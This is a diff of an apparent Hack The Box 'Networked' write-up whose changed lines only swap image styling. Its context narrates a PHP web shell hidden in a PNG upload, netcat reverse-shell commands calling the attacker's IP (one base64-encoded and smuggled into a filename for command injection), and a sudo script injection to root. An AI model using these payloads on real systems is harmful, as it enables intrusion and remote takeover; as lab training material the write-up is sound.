@@ -19,7 +19,7 @@ PORT    STATE  SERVICE
 
 Looks like we're going to be pentesting a web app, so I check out port 80 and find this:
 
-![Networked2.png](/assets/images/Networked/Networked2.png){: .center-aligned width="600px"}
+![Networked2.png](/assets/images/Networked/Networked2.png){: .responsive-image}
 
 Not much going on there, so I start feroxbuster and quickly find `http://10.10.10.146/uploads/` and `http://10.10.10.146/backup/backup.tar`, and that's about it. I download the backup.tar file and find: 
 
@@ -32,24 +32,24 @@ Not much going on there, so I start feroxbuster and quickly find `http://10.10.1
 
 These php files are all available through the browser, so maybe if we read through them we can figure out how to exploit them. Upload.php seems to suggest the file types are limited to images. 
 
-![Networked3.png](/assets/images/Networked/Networked3.png){: .center-aligned width="600px"}
+![Networked3.png](/assets/images/Networked/Networked3.png){: .responsive-image}
 
 This fits with the photos.php page. 
 
-![Networked4.png](/assets/images/Networked/Networked4.png){: .center-aligned width="600px"}
+![Networked4.png](/assets/images/Networked/Networked4.png){: .responsive-image}
 
 Unfortunately when I browse to the upload.php page and attempt to upload any of these images, I get a `Invalid file type` response. It turns out this is because my sample files are too big. 
 
-![Networked5.png](/assets/images/Networked/Networked5.png){: .center-aligned width="600px"}
+![Networked5.png](/assets/images/Networked/Networked5.png){: .responsive-image}
 
 So I get another sample file and try again, and the upload works. 
 
-![Networked6.png](/assets/images/Networked/Networked6.png){: .center-aligned width="600px"}
+![Networked6.png](/assets/images/Networked/Networked6.png){: .responsive-image}
 
 It also change the file name to my ip address with `_`'s instead of `.`'s. So the game here is probably going to be to upload a shell of some kind, but making it look like a png file. That rules out ivan's PHP reverse shell by the way. So it will have to be something pretty small. From the code snippet above, we know that the upload.php only accepts image files, but we might be able to spoof them. 
 
 Initially I try to do this by adding the magic bytes for PNG files (`89 50 4E 47 0D 0A 1A 0A`) and insuring that the Content-Type in the HTTP request is set to `image/png`. 
-![Networked7.png](/assets/images/Networked/Networked7.png){: .center-aligned width="600px"}
+![Networked7.png](/assets/images/Networked/Networked7.png){: .responsive-image}
 
 I can't seem to get this uploaded whether it's called `shell.php` or `shell.php.png`, so I decided to go another route and use a real sample png file, simply using `shell.php.png` as the file name and appending some php to the end. In my case I went with: 
 
@@ -59,10 +59,10 @@ I can't seem to get this uploaded whether it's called `shell.php` or `shell.php.
 
 This will allow me to open the file and use cmd as a parameter to send a command. Here I run the command as `whoami` and get the result of apache at the bottom. 
 
-![Networked8.png](/assets/images/Networked/Networked8.png){: .center-aligned width="600px"}
+![Networked8.png](/assets/images/Networked/Networked8.png){: .responsive-image}
 I fiddle with this for a while, trying a few options to get a shell (can't find an ssh key) and wind up with `http://10.10.10.146/uploads/10_10_14_3.php.png?cmd=nc+10.10.14.3+445+-e+/bin/bash` which gets me the shell:
 
-![Networked9.png](/assets/images/Networked/Networked9.png){: .center-aligned width="600px"}
+![Networked9.png](/assets/images/Networked/Networked9.png){: .responsive-image}
 
 I navigate to the `/home` directory and find that while I can access the only user's (guly) directory, I cannot read the user.txt file. I can read `crontab.guly` and `check_attack.php`. The crontab just shows that check_attack is being run, but check_attack looks like this:
 ```
@@ -118,15 +118,15 @@ Given that the issue seems to be with the slashes, we can just use base64 to enc
 `touch 'a; echo bmMgMTAuMTAuMTQuMyA4ODg4IC1lIC9iaW4vYmFzaA== | base64 -d | sh; b'`, adn this actually gets a stable shell. 
 
 
-![Networked10.png](/assets/images/Networked/Networked10.png){: .center-aligned width="600px"}
+![Networked10.png](/assets/images/Networked/Networked10.png){: .responsive-image}
 
 I grab the user.txt file and see what guly can do with `sudo -l`.
 
-![Networked11.png](/assets/images/Networked/Networked11.png){: .center-aligned width="600px"}
+![Networked11.png](/assets/images/Networked/Networked11.png){: .responsive-image}
 
 The changename.sh file looks like this:
 
-![Networked12.png](/assets/images/Networked/Networked12.png){: .center-aligned width="600px"}
+![Networked12.png](/assets/images/Networked/Networked12.png){: .responsive-image}
 
 This script is writing to the `ifcfg-guly` script based on input that I give it. It asks me for the input for `interface NAME`, `interface PROXY_METHOD`, `interface BROWSER_ONLY`, and `interface BOOTPROTO`. No matter what I put, I get an error:
 
@@ -135,7 +135,7 @@ ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem
 ```
  But after trying a bunch of different things, it turns out that if there is a space in the variable, it will get executed as a command. So if the responses to the inputs are: `test /bin/bash`, `test`, `test`, and `test /bin/bash`, we get a root shell:
 
-![Networked13.png](/assets/images/Networked/Networked13.png){: .center-aligned width="600px"}
+![Networked13.png](/assets/images/Networked/Networked13.png){: .responsive-image}
 
 And then we can grab the root.txt. 
 
